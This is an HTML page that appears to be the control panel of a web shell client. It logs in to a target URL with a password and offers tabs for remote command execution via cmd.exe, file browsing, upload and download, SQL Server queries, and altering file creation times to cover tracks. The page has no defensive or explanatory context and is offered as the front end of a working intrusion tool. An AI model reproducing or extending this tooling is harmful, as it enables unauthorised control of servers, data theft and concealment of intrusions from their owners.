<html>
<head>
    <link href="css/main.css" rel="stylesheet" />
    <script src="js/main.js"></script>
    <script src="js/send.js"></script>
    <script src="js/explorer.js"></script>
</head>
<body>
    <div style="border: 1px solid #ccc; border-bottom: none">
        <table>
            <tr>
                <td class="h">Login</td>
                <td class="b">
                    <t>Url :</t>
                    <input id="url" class="mmm" type="text" style="width: 300px" onkeypress="return grabEnter(event, this);" />
                    <t>Password :</t>
                    <input id="p" class="mmm" type="text" style="width: 300px" onkeypress="return grabEnter(event, this);" />
                    <input type="button" id="btnLogin" value="Login" onclick="login(this);" />
                </td>
            </tr>
        </table>
    </div>

    <div class="tbbt">
        <button class="tblnk active" onclick="openTab(event, 'tbMain')">Command</button>
        <button class="tblnk" onclick="openTab(event, 'tbDir')">Explorer</button>
        <button class="tblnk" onclick="openTab(event, 'tbUpload')">Upload</button>
        <button class="tblnk" onclick="openTab(event, 'tbDownload')">Download</button>
        <button class="tblnk" onclick="openTab(event, 'tbSqlServer')">Sql Server</button>
        <button class="tblnk" onclick="openTab(event, 'tbChangeTime')">Change Time</button>
    </div>
    <div id="tbMain" class="tb" style="display: block">
        <table>
            <tr>
                <td class="h">Address</td>
                <td class="b">
                    <t>Current Location :</t>
                    <y id="loc"></y>
                    <input type="button" value="Use" onclick="use()" />
                    <input type="button" value="Reset Form" onclick="reset()" />
                    <div style="float: right">v6.1</div>
                </td>
            </tr>
        </table>
        <hr>

        <form action="/" method="post">
        <table>
            <tr>
                <td class="h">Command</td>
                <td class="b">
                    <t>Process :</t>
                    <input id="pro" class="mmm" type="text" value='cmd.exe' onkeypress="return grabEnter(event, this);" /><br>
                    <t>Command :</t>
                    <input id="cmd" class="mmm" type="text" onkeypress="return grabEnter(event, this);" />
                    <input type="button" value="Execute" onclick="command(this);" />
                </td>
            </tr>
        </table>
        </form>
    </div>
    <div id="tbDir" class="tb">
        <table>
            <tr>
                <td class="h">Explorer</td>
                <td class="b">
                    <t>Address :</t>
                    <input id="exadd" class="mmm" type="text" onkeypress="return checkEnter(event);" />
                    <input type="submit" value="Explore" onclick="sendAddress();" style="margin-right: 5px;" />
                    <span id="loader" class="loader" style="display: none"></span>
                </td>
            </tr>
        </table>
        <hr />
        <div id="objLocation">
            <div class="objS">Location :</div>
            <div class="objD objL" onclick="setAddress(this.innerText);">root</div>
        </div>
        <div id="objFrame">
        </div>
    </div>
    <div id="tbUpload" class="tb">
        <form class="form" action="/" method="post">
            <table>
                <tr>
                    <td class="h">Upload</td>
                    <td class="b">
                        <t>File name :</t>
                        <input name="upl" type="file" /><br>
                        <t>Save as :</t>
                        <input name="sav" class="mmm" type="text" />
                        <input name="vir" type="checkbox" /><g>Is virtual path</g><br>
                        <t>New File name :</t>
                        <input name="nen" class="mmm" type="text" />
                        <input type="submit" value="Upload" onclick="subm();" />
                    </td>
                </tr>
            </table>
        </form>
        <hr>
        <form class="form" action="/" method="post">
            <table>
                <tr>
                    <td class="h">Upload Base64</td>
                    <td class="b">
                        <t>Base64 File :</t>
                        <textarea name="baseFile"></textarea>
                        <input name="baseVir" type="checkbox" /><g>Is virtual path</g><br>
                        <t>File Path and Name :</t>
                        <input name="baseAddr" class="mmm" type="text" value='' />
                        <input type="submit" value="Upload" onclick="subm();" />
                    </td>
                </tr>
            </table>
        </form>
    </div>
    <div id="tbDownload" class="tb">
        <table>
            <tr>
                <td class="h">Download</td>
                <td class="b">
                    <t>File name :</t>
                    <input id="don" type="text" />
                    <input type="button" value="Download" onclick="download(this);" />
                </td>
            </tr>
        </table>
    </div>
    <div id="tbSqlServer" class="tb">
        <form class="form" action="/" method="post">
            <table>
                <tr>
                    <td class="h">Sql Server</td>
                    <td class="b">
                        <input style="margin: 0 0 3px 192px" type="button" value="Standard Connection Sample" onclick="document.getElementsByName('sqc')[0].value = 'Server=.;Database=db;User Id=user;Password=pass'" />
                        <input style="margin: 0 0 3px 0" type="button" value="Trusted Connection Sample" onclick="document.getElementsByName('sqc')[0].value = 'Server=.;Database=db;Trusted_Connection=True'" /><br />
                        <t>Connection String :</t>
                        <input name="sqc" class="mmm" type="text" value='' /><br />
                        <t>Query :</t>
                        <textarea name="sqq" class="mmm"></textarea>
                        <input type="submit" value="Run" onclick="subm();" />
                    </td>
                </tr>
            </table>
        </form>
    </div>
    <div id="tbChangeTime" class="tb">
        <form class="form" action="/" method="post">
            <table>
                <tr>
                    <td class="h">Change Creation Time</td>
                    <td class="b">
                        <input name="hid" type="hidden" />
                        <t>File name :</t>
                        <input name="tfil" class="mmm" type="text" />
                        <input type="submit" value="Get" onclick="subm(); document.getElementsByName('hid')[0].value = '1'" /><br>
                        <t>From This File :</t>
                        <input name="ttar" class="mmm" type="text" />
                        <input type="submit" value="Set" onclick="subm(); document.getElementsByName('hid')[0].value = '2'" /><br>
                        <t>New Time :</t>
                        <input name="ttim" class="mmm" type="text" />
                        <input type="submit" value="Set" onclick="subm(); document.getElementsByName('hid')[0].value = '3'" />
                    </td>
                </tr>
            </table>
        </form>
    </div>
    <br />
    <pre id="log"></pre>
    <script>loadForm(); getLocation();</script>
</body>
</html>
